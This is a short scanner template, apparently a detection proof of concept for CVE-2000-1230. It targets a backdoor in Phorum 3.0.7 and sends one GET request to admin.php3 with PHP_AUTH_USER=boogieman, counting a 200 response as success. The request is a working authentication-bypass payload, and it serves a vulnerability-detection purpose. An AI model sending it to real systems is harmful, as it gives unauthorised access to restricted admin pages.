id = "POC-AVE-2000-00001"
name = "CVE-2000-1230 PoC"
author = "AVE"
severity = "medium"
tags = ["cve-2000-1230"]
description = "检测 Phorum 3.0.7 auth.php3 后门漏洞，通过设置 PHP_AUTH_USER=boogieman 绕过认证访问受限页面"
vuln_id = ["CVE-2000-1230", "AVE-2000-00001"]

[poc]
logic = "any"

[[poc.requests]]
protocol = "http"
method = "GET"
path = "/{{BaseURL}}/admin.php3?PHP_AUTH_USER=boogieman"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

